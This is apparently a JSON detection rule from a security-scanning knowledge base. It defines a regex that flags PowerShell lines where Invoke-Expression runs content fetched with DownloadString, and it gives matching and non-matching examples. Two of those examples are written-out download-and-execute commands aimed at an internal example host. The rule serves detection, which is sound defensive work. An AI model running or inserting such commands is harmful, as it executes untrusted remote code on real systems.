{
  "schemaVersion": "drobon.knowledge.pattern/v1",
  "id": "DPK-PAT-1088",
  "title": "Signal: Remote content executed in PowerShell in powershell — review required",
  "targets": [
    "powershell"
  ],
  "signal": {
    "kind": "regex",
    "source": "\\b(?:Invoke-Expression[^\\n]*DownloadString)"
  },
  "scope": "Single-line match on Invoke-Expression with a download in powershell.",
  "limitations": "Lexical: matches the two cmdlets on one pipeline; obfuscated variants that split the string are out of scope.",
  "examples": [
    {
      "line": "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"http://example.internal/a.ps1\")",
      "match": true
    },
    {
      "line": "# audit: Invoke-Expression (New-Object Net.WebClient).DownloadString(\"http://example.internal/a.ps1\") present",
      "match": true
    },
    {
      "line": "$pkg = Get-AuthenticodeSignature ./tool.ps1; if ($pkg.Status -eq \"Valid\") { & ./tool.ps1 }",
      "match": false
    },
    {
      "line": "# verified: $pkg = Get-AuthenticodeSignature ./tool.ps1; if ($pkg.Status -eq \"Valid\") { & ./tool.ps1 }",
      "match": false
    }
  ],
  "fpNotes": "A bootstrap script that verifies a signed package before execution is the accepted exception.",
  "linkedRules": [
    "DPK-SAST-905"
  ],
  "origin": "original-authored",
  "cell": "sast:powershell-downloadstring:powershell",
  "validationStatus": "VALIDATED"
}
